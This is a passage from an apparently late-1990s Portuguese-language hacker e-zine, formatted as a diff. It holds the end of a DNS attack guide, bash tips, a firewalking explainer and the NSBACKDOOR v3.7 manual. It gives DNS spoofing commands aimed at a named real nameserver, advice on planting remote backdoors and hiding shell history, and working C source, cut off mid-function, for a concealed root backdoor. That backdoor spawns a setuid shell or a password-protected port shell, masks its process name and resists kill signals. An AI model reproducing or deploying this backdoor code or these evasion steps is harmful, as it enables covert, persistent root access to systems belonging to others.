+   Como exemplo disso coloquei na minha page um xploit que eu fiz para
+testar a vulnerabilidade do nslookup. Porem lembre-se que para o xploit
+fazer efeito o programa precisa ter setuid ou estar sendo rodado pelo
+root (como no caso dos daemons), por tanto o xploit de nslookup eh
+inofensivo. Mas ja serve como um exemplo.
+
+#########################
+7.4. Cuidados Pos-Hacking
+#########################
+
+   O normal eh que os xploits derrubem o named depois de 0wna-lo. Isso
+eh uma pista certa para o admin que seu sistema foi atacado.
+   Para evitar rastros crie uma backdoor remota e ative o named atravez
+dela. Nao tente ativa-lo pela shell aberta com o xploit.
+   O syslogd pode ser configurado para gravar as acoes do named. Talvez
+seja bom dar uma olhada nestes logs antes de sair comemorando.
+
+###########
+8. Spoofing
+###########
+
+   Essa t3kn33k consiste em enganar uma maquina fazendo-a pensar que e'
+outra. Como isso pode ser util??? Em sistemas unix existe algo chamado
+trusted hosts. Ou seja, a maquina so' dara acesso a hosts confiaveis.
+   Com o spoof nos podemos nos "disfarcar" com um destes hosts e ter
+acesso as demais maquinas.
+   Spoofing tb serve para esconder seu endereco real e evitar o rastrea-
+mento. Assim torna-se mais dificil de alguem encontra-lo.
+   Para spoofarmos precisamos de r00t no minimo em 2 maquinas. Sendo 1
+delas a sua e outra um nameserver.
+
+   Vou usar dominios exemplos para deixar as coisas mais claras...
+
+hacker.com       = Sua maquina;
+200.20.2.1       = Seu ip;
+NS.we.are.cool   = nameserver r00ted;
+Eu.sou.mto.foda  = Dominio falso que queremos ter.
+
+   No nameserver NS.we.are.cool deve ter um sub-dominio indicando que o NS
+eh a sua maquina (hacker.com).
+
+merda              IN      NS      hacker.com.
+
+   Na sua maquina (hacker.com) rode o jizz na seguinte sintaxe:
+
+./jizz <beginhost> <fakenshost> <fakensip> <fakensdom> <spoofedip> <spoofedhost>
+
+   Onde:
+<beginhost>   - merda.we.are.cool
+<fakenshost>  - hacker.com
+<fakensip>    - 200.20.2.1
+<fakensdom>   - we.are.cool
+<spoofedip>   - 200.20.2.1
+<spoofedhost> - Eu.sou.mto.foda
+
+  Entao ficaria:
+
+./jizz merda.we.are.cool hacker.com 200.20.2.1 we.are.cool 200.20.2.1
+Eu.sou.mto.foda
+
+   O que o jizz faz?? Ele diz que merda.we.are.cool eh um nickname para
+Eu.sou.mto.foda e que esse host tem endereco 200.20.2.1.
+   Apos fazer issu voce precisa fazer o servidor que voce quer acessar ter
+acesso a essa info. Digamos que voce queira acessar a irc.brasnet.com.br.
+O nameserver da brasnet eh NS.brasnet.com.br. Entao fazemos o seguinte:
+
+~# nslookup -type=soa merda.we.are.cool NS.brasnet.com.br
+
+   Para confirmar se deu tudo certo faca:
+
+~# nslookup Eu.sou.mto.foda NS.brasnet.com.br
+
+   Prontinhu...
+   Existem outros programas que fazem spoofing de DNS mas eu decidi
+explicar o jizz por ele ser o mais popular.
+
+##############
+9. Quero Mais!
+##############
+
+   - Que tal o meu toque especial???
+   - Quero mais!!!
+   - Ta bom! Entao um pouco mais!
+
+   Pra quem ainda nao cansou de ler ou quer se aprofundar mais nessa area,
+podem ir atras dos seguintes RFCs:
+
+RFC 2052
+   A DNS RR for specifying the location of services (DNS SRV)
+   by A. Gulbrandsen, P. Vixie
+   October 1996
+
+RFC 1918
+   Address Allocation for Private Internets
+   by Y. Rekhter, R. Moskowitz, D. Karrenberg, G. de Groot, E. Lear
+   02/29/1996.
+
+RFC 1912
+   Common DNS Operational and Configuration Errors
+   by D. Barr
+   02/28/1996.
+
+RFC 1713
+   Tools for DNS debugging
+   by A. Romao
+   11/03/1994.
+
+RFC 1712
+   DNS Encoding of Geographical Location
+   by C. Farrell, M. Schulze, S. Pleitner, D. Baldoni
+   11/01/1994.
+
+RFC 1183
+   New DNS RR Definitions
+   by R. Ullmann, P. Mockapetris, L. Mamakos, C. Everhart
+   10/08/1990.
+
+RFC 1035
+   Domain names - implementation and specification
+   by P. Mockapetris
+   11/01/1987
+
+RFC 1034
+   Domain names - concepts and facilities
+   by P. Mockapetris
+   11/01/1987
+
+RFC 1033
+   Domain administrators operations guide
+   by M. Lottor
+   11/01/1987
+
+RFC 1032
+   Domain administrators guide
+   by M. Stahl
+   11/01/1987
+
+RFC 974
+   Mail routing and the domain system
+   by C. Partridge
+   01/01/1986.
+
+#######
+10. Fin
+#######
+
+   Finalmente acabamos este manual definitivo de DNS.
+   Como falei na introducao e volto a repetir, as fontes deste manual
+foram HOWTOs e Man pages. A secao que explica o bug NXT teve como base
+o texto escrito pelo E-Mind.
+   E isso e' tudo.
+   Espero que tenham curtido este Manual pois deu trabalhao para faze-lo.
+
+        _xXXXP^''                    ``^YXXXx_
+     _xXXXXP~         04 - Bash          ~YXXXXx_
+  _xXXXXXX(                                )XXXXXXx_
+xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
+YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
+  ~YXXXXXX(                                )XXXXXXP~
+     ~YXXXXb_           syscall          _dXXXXP~
+        ~YXXXbx..                    ..xdXXXP~
+
+				BASH: Lar doce Lar
+				==================
+
+    syscall
+    -------
+
+    Onde  voce passa  maior  parte  do tempo? Hehe, bash! Entaum deixe-o mais
+    amigavel,  mais  flexivel...  O  bash eh  um  programa bem complexo e bem
+    configuravel. Um bom profile pode facilitar muito a vida ;)
+
+1 - Meta keys
+
+    Vamos comecar pela  linha de comando... Em muitas  distribuicoes de linux
+    as chamadas  teclas 'metas' (meta keys) nao "funcionam". As meta keys sao
+    teclas como end, home, del, insert, etc. O debian eh a unica  distribuicao
+    que  conheco  que  vem  com  as  teclas  ja habilitadas. Pra essas teclas
+    estarem  ``habilitadas'',  uma  biblioteca eh necessaria: <libreadline> e
+    um pequena modificacao no arquivo /etc/inputrc, se  voce ainda nao tem um
+    crie com as seguintes linhas, se ja tem um acrescente as seguinteslinhas:
+
+    input-meta on
+    set output-meta on
+
+    um exemplo de /etc/inputrc:
+===================================[ CUT HERE ]=================================
+set meta-flag on
+set input-meta on
+set convert-meta off
+set output-meta on
+
+"\eOd": backward-word
+"\eOc": forward-word
+
+# for linux console
+"\e[1~": beginning-of-line
+"\e[4~": end-of-line
+"\e[5~": beginning-of-history
+"\e[6~": end-of-history
+"\e[3~": delete-char
+"\e[2~": quoted-insert
+
+# for xterm
+"\eOH": beginning-of-line
+"\eOF": end-of-line
+
+#for freebsd console
+"\e[H": beginning-of-line
+"\e[F": end-of-line
+=============================[ Cut Here ]======================================
+    Lembrando  que  as configuracoes foram testadas no bash 2.01.1(1)-release
+    e libreadline 2.1-bash em  um slack 3.5. Acho  que  funcionam com versoes
+    mais antigas do bash e da libreadline, ja que no debian 1.3 ja funcionava
+
+2 - Completation
+
+    Pra quem nao sabe o bash completa  comandos e nomes de arquivo (TAB). Mas
+    pra galera ligada no  coding  aas  vezes atrapalha :/ ex. se tiverem dois
+    arquivos, prg.c prg.o, e vamos  supor que quero editar o prg.c, digitando
+    `mcedit pr'  e  apertando  TAB o  bash vai completar pra "prg." e beepara
+    mostrando as  duas  opcoes.  Mas  tem  como  desabilitar  alguns nomes de
+    arquivos fazendo o bash  ignora-los  na  hora de completar. Eh a variavel
+    de ambiente  `FIGNORE'.  Exemplo: Pra ignorar arquivos que tenham `.o' ou
+    `~' no nome basta acrescentar a linha no  seu /etc/profile ou ~/.profile.
+
+    FIGNORE=".o:~"
+    export FIGNORE
+
+    Os nomes sao separados por ":" voce pode acrescentar quantos quizer.
+    Dica: o bash tambem completa hostnames, basta usar @ na  frente do que se
+    vai  completar. Ex:  @local<TAB>   resulta  @localhost  Pra  fazer  essas
+    completacoes  o  bash  le o arquivo /etc/hosts, mas pode-se trocar, basta
+    definir a variavel HOSTFILE pro nome do arquivo.
+
+3 - CDPATH
+
+    Essa eh uma variavel de ambiente interessante. Alem do  bash completar os
+    diretorios ele tambem tem essa variavel  pra  facilitar na hora de trocar
+    de diretorios. Vamos  supor que voce esta  sempre usando um tal diretorio
+    /arquivos/programas/imagem e nesse diretorio existam outros subdiretorios
+    que  voce  tambem  use  bastante. Ao inves de voce ficar digitando todo o
+    path  pro  diretorio  voce  pode acrescenta-lo  a  variavel CDPATH no seu
+    profile. Funciona no mesmo esquema da FIGNORE. Exemplo:  pra  acrescentar
+    o diretorio dos programas de imagem e o seu home na CDPATH:
+
+    CDPATH="~:/arquivos/programas/imagem"
+    export CDPATH
+
+    Pronto.  Agora  se voce estiver em qualquer diretorio e digitar "cd gimp"
+    e gimp  estiver  no diretorio /arquivos/programas/imagem (claro) voce vai
+    pra la ;)
+
+4 - Bash history
+
+    Tem alguem te espionando. hehe o bash grava num arquivo todos os comandos
+    digitados pra usar  na hora que voce usa as setinhas pra cima e pra baixo
+    pra nao  ter  que digitar  comandos que ja digitou anteriormente. Eh esse
+    arquivo eh terrivel  pra backdoors }) Mas tem como mexer com ele... Sao 2
+    variaveis de ambiente  HISTFILE,  HISTFILESIZE.  Podem  ser  definidas do
+    mesmo modo que CDPATH.
+
+    HISTFILE  ->  Eh o arquivo onde o bash vai gravar os comandos.
+                  Pra backdoors /dev/null basta ;] normalmente fica no home
+		  do usuario com o nome .bash_history
+
+    HISTFILESIZE -> Especifica o numero maximo de comandos a serem gravados
+                  no arquivo. Pra backdoors 0 hehe
+
+    Obs: Mesmo usando /dev/null e 0 respectivamente pras variaveis voce ainda
+         podera usar a  facilidade das  setinhas,  pois  o  bash  armazena os
+	 comandos da  sessao  atual na memoria. Voce soh perdera a facilidade
+	 de usar as setinhas pra comandos de outras sessoes.
+
+5 - ^D^D^D^D
+
+    Pra nao  ter  que  digitar  "logout"  ou "exit" pra sair do bash  tem uma
+    variavel IGNOREEOF que especifica o  numero  de  vezes  que  voce tem que
+    pressionar control+d pra sair do bash. Definindo pra 0 sai de prima :)
+
+    IGNOREEOF=0
+    export IGNOREEOF
+
+6 - TMOUT
+
+    Essa eh boa pros bash do root. Se voce eh paranoico  por  seguranca e tem
+    medo de deixar um bash# no console e  ir  na cozinha buscar cafeh =] Pode
+    usar esta variavel. Ela especifica o  tempo em segundos pro bash se matar
+    caso nao seja digitado nenhum comando. Exemplo: Pra forcar o bash a  auto
+    sair caso voce esteja fora por 2 minutos:
+
+    TMOUT=120
+    export TMOUT
+
+7 - noclobber
+
+    Essa  foi  feito pros  caras que vivem digitando ">" no lugar de "." hehe
+    Ela nao  deixa voce substituir arquivos que ja existem quando redireciona
+    com `>'
+
+    noclobber=y
+    export noclobber
+
+8 - HISTFILE
+
+    O Nome do arquivo de history por padrao ~/.bash_history. se nao setado
+    nao eh salvo os comandos quando se tem rodando uma shell interativa
+    (muito bom para o povo l33t)
+
+9 - HISTCONTROL
+
+    Pode ser setada com o valor ignorespace que ignora linhas comecando com
+    espaco. se tiver o valor ignoredups, linhas q ja estejam no history
+    serao descartadas impedindo q os h4x0rs fiquem dando comandos repetidos
+    como ls , pwd , date , mail...Setando o valor ignoreboth serao ignoradas
+    as duas opcoes anteriores
+
+10 - RTFM
+     man bash, info bash, fuck bash
+
+       _xXXXP^''                     ``^YXXXx_
+     _xXXXXP~     05 - Firewalking       ~YXXXXx_
+  _xXXXXXX(                                )XXXXXXx_
+xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
+YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
+  ~YXXXXXX(                                )XXXXXXP~
+     ~YXXXXb_           syscall          _dXXXXP~
+        ~YXXXbx..                    ..xdXXXP~
+
+				FIREWALKING
+				============
+I.  Apresentacao
+Quando se quer mapear uma rede e se encontra um firewall...ou alocar uma
+backdoor numa porta num servidor atras do firewall eh sempre bom saber quais
+portas estao habilitadas atraves do firewall (isso eh diferente das portas
+abertas no firewall e por isso q nao adiantaria vc cabecao passar um nmap
+pra saber :PP).
+Para isso se existe o firewalking.
+A tecnica de Firewalk foi criada por David Smith (dhg@es2.net) e Michael
+Schiffman (mds@es2.net) e tem como proposito tirar o maximo de informacoes
+de um firewall e que trafego eh permitido atraves dele,atraves do uso da
+analise dos pacotes obtidos atraves de tecnicas de traceroute.
+(esta fora do escopo desse texto explicar o funcionamento das tecnicas de trace
+route)
+
+II. Introducao
+
+O Firewalking nada mais eh que jogar pacotes de diferentes tipos atraves do
+firewall e ver se chega ao seu destino.
+Uma informacao que me parece importante quando analisando as rules de um
+firewall seria saber quais o protocolos que sao filtrados, vc pode
+facilmente verificar isso dessa maneira.
+Diriamos que o firewall esta filtrando todos os pacotes UDP que entram e saem,
+entao vc facilmente pode ver quem esta por tras daquele firewall mudando o tipo
+de pacote que sera mandado para fazer essa verificao, observe o esquema:
+
+1) host manda UDP -> firewall
+    firewall -> nao retorna nada
+
+2) host manda ICMP -> firewall
+   firewall responde -> HOST
+
+No primeiro exemplo o firewall retem todos os pacotes UDP, ou seja, vc nao
+vai obter nenhum resposta, nunca vai saber que diabos esta atras daquelae
+firewall, mas no segundo o exemplo vc manda um pacote ICMP e obtem o
+ICMP_TIME_EXCEED do host, dai vc pode tirar a conclusao de que os pacotes
+ICMP nao sao filtrados, esse exemplo se expande para os outros protocolos da
+mesma maneira. Mas como nem tudo eh perfeito pode existir a possibilidade do
+firewall filtrar todo o tipo de pacote ICMP que entra e sai(no momento nos
+estamos preocupados com os que saem, pq precisamos de uma resposta do host),
+e se esse for o caso vc nao vai conseguir tirar nenhuma informacao desse host.
+
+Nota:Traceroute no Ms-winXXX eh baseado em ICMP ja dos *nix em UDP porem
+pode ser configurado para rodar usando icmp (traceroute -I)
+
+Nota2:Hoje o Firewalk soh aceita dois protocolos TCP e UDP, porem como usa
+libnet e talz fica facil implementar novos tipos de protocolos.( Por exemplo
+IGMP um tipo de protocolo que ninguem fecha no firewall)
+
+II-b. Portas Filtradas
+
+Tambem eh muito simples se obter informacoes sobre que portas sao filtradas,
+vamos tomar como base uma firewall q filtre todo o trafico UDP e TCP, exceto
+para pacotes TCP na porta 80,para descobrir quem esta dessa informacao ou ateh
+mesmo pra descobrir se essa porta eh ou nao filtrada vc deve especificar a porta
+inicial que o programa de traceroute ira usar, mas isso nao eh tao simples, se
+vc quer a informacao sobre a porta 80 vc deve fazer a seguinte continha(VIVA A
+MATEMATICA!):
+
+porta_inicial = [porta_alvo - (hops * queries)] - 1
+
+Se vc nao esta familiarizado a essa nomenclatura, uma breve explicacao:
+
+hops - seria o numero de hosts que exitem ateh a firewall(essa explicacao eh
+um tosca e grotesca, mas nao me vem nada melhor)
+
+queries - por default sao 3, sao o numero de vezes que o programa de
+traceroute testa o mesmo host
+
+Aplicando a formula no nosso caso seria(vamos usar os numeros ficticios de 3
+hops e 3 queries):
+
+[80 - (3 * 3)] - 1 = 70
+
+Ou seja nos iriamos especificar como porta inicial a porta 70 e entao
+iriamos saber se a nossa suspeita sobre a porta 80 eh real ou nao, se for
+real vc ira obter resposta, senao nao recebera nada.
+Tao simples e facil quanto parece!
+
+II-c. Aumentando as Possibilidades
+
+Tendo em vista que o traceroute funciona com qualquer protocolo em cima de
+um pacote IP, desse modo vc pode probear uma infinidade de protocolos.
+
+III. Como Evitar o uso do Firewalking Contra sua Firewall
+
+Bom a solucao mais simples eh desabilitar o trafego de pacotes ICMP contendo
+a ICMP_TIME_EXCEED(11), o problema dessa forma de prevencao eh acabar com o
+uso tradicional do traceroute, outra forma de evitar isso seria o uso de um
+servidor proxy ou NAT. Alguns IDS podem notar esse tipo de ataque, mas ha'
+inumeras formas de enganar o IDS.
+
+IV. Maiores Informacoes
+
+http://www.es2.net/research/firewalk - pagina dos criadores da tecnica
+http://www.packetfactory.net/firewalk - arroute
+man traceroute(1)
+
+       _xXXXP^''                     ``^YXXXx_
+     _xXXXXP~   06 - NSBACKDOOR v3.7     ~YXXXXx_
+  _xXXXXXX(                                )XXXXXXx_
+xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
+YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
+  ~YXXXXXX(                                )XXXXXXP~
+     ~YXXXXb_        Cheat Struck        _dXXXXP~
+        ~YXXXbx..                    ..xdXXXP~
+
+NSBACKDOOR v3.7   (C) Cheat Struck 1999
+#######################################
+
+  Email: cheat@struck.8m.com
+  Page : struck.8m.com
+
+  topicos:
+  - Introducao
+  - 1.1. Configurando a backdoor
+  -   2. SUIDBACK
+  -   3. DAEMONBACK
+  - 2.1. Configurando o modo de ativacao
+  -   2. FILENAME
+  -   3. FILEPASS
+  -   4. PINGPKT
+  -   5. CONNECT
+  - 3.1. Configurando o LOG
+  -   2. LOGID
+  -   3. LOGACT
+  -   4. LOGIP
+  - 4.1. Tecnicas usadas
+  -   2. FAKENAME
+  -   3. GETSHELL
+  -   4. IMMORTAL
+  - 5.1. Exemplos de uso das Backdoors
+  -   2. SUIDBACK
+  -   3. DAEMONBACK
+  - 6.1. Exemplos de como ativar as backdoors
+  -   2. FILENAME / FILEPASS
+  -   3. PINGPKT
+  -   4. CONNECT
+  - 7.1. FIN
+
+  Introducao
+  ##########
+  Bem...
+  NSBACKDOOR eh uma backdoor que somente eh ativada atravez de um arquivo,
+de uma conexao a uma porta ou a um ping com o tamanho certo do pacote.
+  A 2 tipos de backdoor e 4 meios de ativa-la mas vc pode usar apenas 1
+opcao de cada uma.
+  A configuracao eh feita no cabecalho do source. Veja como...
+
+  1.1. Configurando a backdoor...
+  ###############################
+  Procure pelas seguintes linhas:
+
+#define SUIDBACK
+#undef  DAEMONBACK
+
+  Aqui voce encontra 2 opcoes para backdoor. Use #define para abilitar
+e #undef para desabilitar.
+
+  1.2. SUIDBACK
+  #############
+  Esta eh a famosa backdoor de shell com suid. O problema dela eh que voce
+ira precisar de uma shell(telnet, ssh, rlogin, rsh,...) no sistema para
+pode-la executar.
+  As novas shells (bash 2.x e outras) nao permitem que esta backdoor seja
+criada.
+  Para definir o arquivo onde ela sera criada procure a linha:
+
+#define BACK_FILE "/tmp/.s"
+
+  1.3. DAEMONBACK
+  ###############
+  Eh criada uma porta para conexoes cuja pode ou nao pedir uma senha para
+rodar a shell.
+  Voce define a porta na seguinte linha:
+
+#define PORT      7374
+
+  Vc define se quer que uma senha seja pedida na seguinte linha:
+
+#define ONPASS
+
+  Use #define para abilitar e #undef para desabilitar.
+  Se vc usar a opcao ONPASS defina a senha na seguinte linha:
+
+#define PASSWORD  "fucklit0"
+
+  2.1.  Configurando o modo de ativacao...
+  ########################################
+  Procure pelas linhas:
+
+#define FILENAME
+#define FILEPASS
+#undef  PINGPKT
+#undef  CONNECT
+
+  Aki temos 4 meios de ativacao. #define abilita e #undef desabilita. Ao
+invez de #undef pode ser apenas comentada a linha.
+
+  2.2. FILENAME
+  #############
+  A backdoor eh ativada qdo um simples arquivo eh criado.
+  Para definir o arquivo procure por:
+
+#define TMP_FILE  "/tmp/.teta7374"
+
+  Espere por 1 minuto e veja o resultado. O arquivo tera sido apagado e a
+backdoor criada.
+
+  2.3. FILEPASS
+  #############
+  Faz o mesmo do q o FILENAME porem dentro do arquivo devera conter a
+senha definida na seguinte linha:
+
+#define PASSWORD  "fucklit0"
+
+  2.4. PINGPKT
+  ############
+  Basta enviar um pacote do tamanho certo e a backdoor eh aberta.
+  Para issu basta usar o comando "ping -s <TAMANHO> <HOST>".
+  O tamanho do pacote eh setado na seguinte linha:
+
+#define SIZEPACK  15
+
+  2.5. CONNECT
+  ############
+  Isto abre uma porta esperando por uma unica conexao. Ao conectar-se c a
+senha entrada for incorreta a porta eh fechada e soh volta a ser aberta
+dentro de 1 minuto. Caso a senha seja valida a backdoor eh criada.
+  A porta eh definida em:
+
+#define PORT      7374
+
+  E a senha em:
+
+#define PASSWORD  "fucklit0"
+
+  3.1. Configurando o LOG
+  #######################
+  Sim... Voce pode logar tudo o que acontece com a nsback em um file. Para
+ligar/desligar o log ache a linha:
+
+#define MAKELOG
+
+  #define liga e #undef (ou comentario) desliga.
+  O arquivo onde o log eh salvo pode ser mudado em:
+
+#define LOG_FILE  "/tmp/.nsb"
+
+  O log salva neste arquivo 3 informacoes que voce pode abilitar/desabilitar em:
+
+#define LOGID  1
+#define LOGACT 1
+#define LOGIP  1
+
+  Coloque 1 para ligar e 0 para desligar.
+
+  3.2. LOGID
+  ##########
+  Cada informacao gravada no log tem uma identificacao de 3 numeros. Sao estas:
+
+101  -  SuidBack open
+102  -  DaemonBack open
+201  -  File Activated
+202  -  File+Pass Activated
+203  -  Ping Packet Activated
+204  -  Connect to port Activated
+
+  Para impedir que o log seja facilmente encontrado pelo admin voce pode
+abilitar apenas esse tipo de log e salvar a tabela acima.
+
+  3.3. LOGACT
+  ###########
+  Salva no log a descricao da acao.
+  Um detalhe importante. Caso voce esteje usando o modo de ativacao FILEPASS.
+pode ocorrer o seguinte caso:
+  Qdo o arquivo eh encontrado e nenhuma senha ou uma senha incorreta esteje
+dentro dele, ele salva no log o seguinte:
+
+201:File Activated
+
+  Mesmo que o modo de ativacao nao seja este.
+  Porem a backdoor soh sera aberta qdo a senha estiver correta no arquivo.
+
+  3.4. LOGIP
+  ##########
+  Todas as conexoes remotas que estiverem ligadas a nsback sera logado tbm o ip
+do cliente.
+  Em acoes locais este campo tera um "(NULL)" substituindo o ip.
+  As conexoes remotas podem ser:
+
+102  -  DaemonBack open
+203  -  Ping Packet Activated
+204  -  Connect to port Activated
+
+  4.1. Tecnicas usada
+  ###################
+  Este programa possui muitas tecnicas que fogem do conceito de uma simples
+backdoor. Vamos ver algumas.
+
+  4.2. FAKENAME
+  #############
+  Como todo trojam e sniffer q ce preze, este programa tbm maskara sua cara no
+ps para que nao seja facilmente encontrado. A maskara do prog pode ser
+mudada em:
+
+#define FAKENAME  "fsck.ext2"
+
+  4.3. GETSHELL
+  #############
+  Para que nao ocorra nenhum problema com a shell q sera aberta na backdoor, o
+prg busca pela shell do root no passwd para que esta seja usada e nao
+alguma shell pre-definida q venha a ser restrita e vc nao saiba.
+
+  4.4. IMMORTAL
+  #############
+  O programa recebeu uma linha para ignorar o sinal de termino, o que o deixa
+praticamente imune a kills. Para killar o prog voce precisa digitar
+"kill -11 <PID>".
+
+  5.1. Exemplos de uso das Backdoors
+  ##################################
+  Aki vao alguns exemplos de como usar a backdoor depois de ja te-la ativada.
+Note que irei entrar com os dados padrao do programa(senha, porta, etc...):
+
+  5.2. DAEMONBACK
+  ###############
+  Remotly:
+
+struck~$ telnet X.X.X.X 7374
+Connected by...
+fucklit0                      <-- digite a senha
+root~#
+root~#
+root~#
+
+  5.3. SUIDBACK
+  #############
+  Local:
+
+struck~$ /tmp/.s
+root~#
+
+  6.1. Exemplos de como ativar as backdoors
+  #########################################
+  Agora vamos ver como voce faz para que essas belezinhas sejam criadas...
+
+  6.2. FILENAME / FILEPASS
+  ########################
+  Local:
+
+struck~$ echo fucklit0 >> /tmp/.teta7374
+(Espere 1 minuto...)
+struck~$
+(Backdoor criada...)
+
+  Remotly:
+
+struck~$ echo fucklit0 >> tmpfile
+struck~$ ftp X.X.X.X
+Connected by....
+ftp> send tmpfile /tmp/.teta7374
+ftp> quit
+struck~$
+(Espere 1 minuto...)
+(Backdoor criada...)
+
+  6.3. PINGPKT
+  ############
+  Remotly:
+
+struck~$ ping -s 15 X.X.X.X
+(espere 1 minuto...)
+(backdoor criada...)
+
+  6.4. CONNECT
+  ############
+  Remotly:
+
+struck~$ telnet X.X.X.X 7374
+Connected by...
+fucklito                        <--- Digite a senha... Uops!!! Senha errada...
+Connect closed...
+struck~$
+(Espere 1 minuto...)
+(Porta aberta...)
+struck~$ telnet X.X.X.X 7374
+Connected by...
+fucklit0                        <--- Digite a senha...
+Connect closed...
+struck~$
+(Backdoor criada...)
+
+  7.1. FIN
+  ########
+  Ok... issu eh tudo o que vc precisava saber sobre o NSBACKDOOR...
+  QQuer duvida, releia esse manual.
+  QQuer bug encontrado no source do programa, mail-me <cheat@struck.8m.com>.
+  Now fear the code!
+
+<++> nsback/nsb37.c
+/*  NSBACKDOOR v3.7 by Cheat Struck <cheat@struck.8m.com>
+ *
+ *  h0h0h0h0... NSBACK updated!!!
+ *  Bem... nessa versao eu realmente fiz uma backdoor super hax0r!!!
+ *  Vamos ver as t3kn33ks usadas neste programa:
+ *
+ *  - Maskara o cmd;
+ *  - Pega a shell do root (no /etc/passwd);
+ *  - Vc pode usar shellbackdoor e daemonbackdoor;
+ *  - Vc pode acionar a back por um arquivo ou arquivo+senha;
+ *  - Vc pode acionar a back por um ping -s SIZEPACK;
+ *  - Vc pode aciona-la por uma conexao a porta+senha;
+ *  - Soh pode ser killado com "kill -11 PID";
+ *  - Voce pode ou nao acionar o password na daemonbackdoor;
+ *  - A configuracao eh feita no source;
+ *  - O log eh salvo em LOG_FILE;
+ *  - O log grava o ip das conexoes remotas;
+ *  - e muito mais...
+ *
+ *  Voce recebera a msg "Terminate". Ignore-a... O programa ta rodando...
+ *  Aproveitem!!!!
+ *
+ */
+
+/* Configuration....
+ *
+ * Now you configure the nsback here
+ * #define               = ON
+ * #undef                = OFF
+ *
+ */
+
+// Config the backdoor used... Choice only 1
+#define SUIDBACK              // suid shell backdoor
+#undef  DAEMONBACK            // remotly shell
+
+// Config the activate mode... Choice only 1 (Else if you use FILEPASS)
+#define FILENAME              // activate with TMP_FILE
+                              // define this if you use FILEPASS
+#define FILEPASS              // activate with TMP_FILE+PASSWORD
+#undef  PINGPKT               // activate with a ping packet
+#undef  CONNECT               // connect to port and write PASSWORD
+
+// Config others...
+#define ONPASS                // Daemonback with password
+#define MAKELOG               // Make log in LOG_FILE
+
+/* Defines...
+ *
+ * Dont change more to #undef...
+ *
+ */
+
+#define PASSWORD  "fucklit0"          // Define Password
+#define PORT      7374                // Define Port
+#define FAKENAME  "fsck.ext2"         // Define Mask
+#define SLEEPTIME 60                  // Define waiting time
+#define SIZEPACK  15                  // Define packet size
+
+// Define files...
+#define BACK_FILE "/tmp/.s"           // This is the shell backdoor
+#define TMP_FILE  "/tmp/.teta7374"    // This is the activate file
+#define LOG_FILE  "/tmp/.nsb"         // This is the log file
+
+// Define Log...
+#ifdef MAKELOG
+#define LOGID  1          // Rec the ID code
+#define LOGACT 1          // Rec the Action
+#define LOGIP  1          // Rec the ip
+#endif
+
+// Ok... Now you can compile and run it...
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <netinet/ip.h>
+#include <signal.h>
+#include <netdb.h>
+#include <arpa/inet.h>
+#include <pwd.h>
+
+char shell[15];
+char pass[sizeof(PASSWORD)];
+char com[2048];
+int s0ck;
+struct sockaddr_in ina;
+
+#ifdef MAKELOG
+struct logtypes
+{
+  int  id;
+  char msg[2000];
+};
+
+void mklog(int t, char addr[15]) {
+  FILE *fp;
+  struct logtypes type[] = {
+    {101,"SuidBack open"},
+    {102,"DaemonBack open"},
+    {201,"File Activated"},
+    {202,"File+Pass Activated"},
+    {203,"Ping Packet Activated"},
+    {204,"Connect to port Activated"},
+    {0,0,0,0}
+  };
+
+  fp=fopen(LOG_FILE,"a+");
+    if(LOGID == 1) fprintf(fp,"%d:",type[t].id);
+    if(LOGACT == 1) fprintf(fp,"%s:",type[t].msg);
+    if(LOGIP == 1) fprintf(fp,"%s", addr);
+    fprintf(fp,"\n");
+  fclose(fp);
+}
+#endif
+
+void get_sh(char user[20]) {
+  struct passwd *p;
+  p = getpwnam(user);
+  sprintf(shell, "%s", p->pw_shell);
+}
+
+#ifdef FILENAME
+int fverify(char *file) {
+   FILE *fp;
+   if((fp=fopen(file,"r")) != NULL) {
+       if(fgets(pass, sizeof(PASSWORD), fp) == NULL) {
+              fclose(fp);
+              sprintf(com, "rm -f %s", TMP_FILE);
+              system(com);
+              #ifdef MAKELOG
+              mklog(2, NULL);
+              #endif
+              return 1;
+       }
+       else {
+              if(strcmp(PASSWORD,pass) == 0) {
+                  fclose(fp);
+                  sprintf(com, "rm -f %s", TMP_FILE);
+                  system(com);
+                  #ifdef MAKELOG
+                  mklog(3, NULL);
+                  #endif
+                  return 2; }
+              else {
+                  fclose(fp);
+                  sprintf(com, "rm -f %s", TMP_FILE);
+                  system(com);
+                  #ifdef MAKELOG
+                  mklog(2, NULL);
+                  #endif
+                  return 1;
+              }
+       }
+   }
+   else return 0;
+}
+#endif
+
+#ifdef DAEMONBACK
+int openport() {
+   int c0nnect, size, spid;
+   struct sockaddr_in client;
+
+   size = sizeof(client);
+   if((c0nnect = accept(s0ck, (struct sockaddr *) &client, &size)) == -1)
+      exit(0);
+
+   #ifdef ONPASS
+     size = sizeof(PASSWORD) - 1;
+     bzero(pass,size);
+     if(recv(c0nnect, pass, size,0) == -1) return 0;
+     if(strncmp((char *)PASSWORD, pass, size) != 0) return 0;
+   #endif
+
+   if(c0nnect < 0) return(0);
+   #ifdef MAKELOG
+   mklog(1, inet_ntoa(client.sin_addr));
+   #endif
+   spid = fork();
+
+   if(spid != 0) {
+
+     dup2(c0nnect,0);
+     dup2(c0nnect,1);
+     dup2(c0nnect,2);
+     execl(shell, "mingetty", "-i", (char *)0);
+
+   }
+
+  close(c0nnect);
+  while( wait(NULL) != -1);
+  return 1;
+
+}
+#endif
+
+#ifdef SUIDBACK
+int makeback(void) {
+  FILE *fp;
+
+  if( (fp=fopen(BACK_FILE,"r")) == NULL ) {
+     sprintf(com, "cp %s %s", shell, BACK_FILE);
+     system(com);
+     sprintf(com, "chmod +s %s", BACK_FILE);
+     system(com);
+     #ifdef MAKELOG
+     mklog(0,NULL);
+     #endif
+  }
+
+}
+#endif
+
+int osock(){
+
+  if((s0ck=socket(AF_INET,SOCK_STREAM,0)) == -1) return 0;
+  bzero((char *) &ina, sizeof(ina));
